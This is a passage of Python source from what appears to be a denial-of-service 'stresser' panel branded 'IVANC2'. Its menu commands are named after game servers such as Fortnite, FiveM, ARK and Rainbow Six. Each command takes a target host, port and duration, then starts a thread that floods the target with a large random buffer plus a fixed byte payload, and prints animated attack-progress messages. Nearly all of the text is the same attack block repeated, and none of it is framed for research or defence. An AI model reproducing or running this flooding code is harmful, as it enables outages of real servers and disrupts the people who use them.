					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortniteovh":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortnitetcp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fortniteudp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "r6kill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "arklift":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "arkdown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemkill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemdown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemrape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivembypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemv1":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemv2":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemslump":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemguard":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemtcp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
